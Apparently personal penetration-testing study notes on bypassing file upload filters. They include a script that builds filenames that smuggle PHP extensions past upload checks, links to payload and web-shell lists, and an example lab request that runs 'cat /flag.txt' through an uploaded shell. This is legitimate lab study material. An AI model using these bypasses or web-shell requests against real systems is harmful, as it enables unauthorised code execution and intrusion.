## Identify allowed file types
```shell-session
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/Web/content-type.txt

cat content-type.txt | grep 'image/' > image-content-types.txt
```

## Filter Bypass

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt

`ls /usr/share/wordlists/seclists/Web-Shells`

## Creating a wordlist

```bash
#!/bin/sh
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':'; do
#modify these extensions for whatever file type you need to test for
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> filenames_wordlist.txt
        echo "shell$ext$char.jpg" >> filenames_wordlist.txt
        echo "shell.jpg$char$ext" >> filenames_wordlist.txt
        echo "shell.jpg$ext$char" >> filenames_wordlist.txt
    done
done
```

## REMEMBER!
disable Payload encoding when using Burp intruder
![[Pasted image 20240817194735.png]]

## File Upload Mindmap

https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png

**FYI**
You don't always have to get rid of the image extension
example: `http://94.237.59.199:51091/profile_images/shell.phar.jpg?cmd=cat+/flag.txt`

## Content Type 

https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt

```shell-session
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/Web/content-type.txt
cat content-type.txt | grep 'image/' > image-content-types.txt
```

### Magic Bytes
https://opensource.apple.com/source/file/file-23/file/magic/magic.mime

### File Signatures
https://en.wikipedia.org/wiki/List_of_file_signatures

